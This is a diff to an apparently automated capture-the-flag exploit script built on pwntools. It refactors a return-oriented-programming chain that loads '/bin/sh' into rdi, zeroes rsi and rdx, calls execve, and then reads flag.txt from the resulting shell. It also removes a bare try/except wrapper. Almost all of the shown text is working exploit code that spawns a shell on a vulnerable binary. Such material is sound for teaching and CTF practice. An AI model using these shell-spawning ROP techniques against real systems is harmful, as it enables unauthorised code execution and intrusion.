@@ -16,10 +16,7 @@ def main():
         if f_anal.has_win():
             ret2win(f_anal)
         elif f_anal.has_execve():
-            try:
-                ret2execve(f_anal)
-            except:
-                print("execpt")
+            ret2execve(f_anal)
 
 def ret2win(f_anal):
     binary = f_anal.binary
@@ -47,17 +44,15 @@ def ret2execve(f_anal):
     chain = b''
 
     # populate arg1 - rdi
-    chain += p64((r.find_gadget(['pop rdi', 'ret']))[0])
-    chain += p64(next(e.search(b'/bin/sh\x00')))
+    chain += get_rop.fill_reg('rdi', next(e.search(b'/bin/sh\x00')))
 
     # populate arg2 - rsi
-    chain += p64((r.find_gadget(['pop rsi', 'ret']))[0])
-    chain += p64(0)
+    chain += get_rop.fill_reg('rsi', 0)
+    #chain += p64((r.find_gadget(['pop rsi', 'ret']))[0])
+    #chain += p64(0)
 
-    # populate arg2 - rdx
-    chain += p64((r.find_gadget(['pop rdx', 'ret']))[0])
-    chain += p64(0)
-
+    # populate arg3 - rdx
+    chain += get_rop.fill_reg('rdx', 0)
 
     chain += p64(e.sym['execve'])
     
@@ -68,5 +63,7 @@ def ret2execve(f_anal):
     io.sendline(b'cat flag.txt')
     io.recvuntil(b'flag')
     print("flag" + io.recvuntil(b'}').decode('utf-8'))
+
+
 
 main()
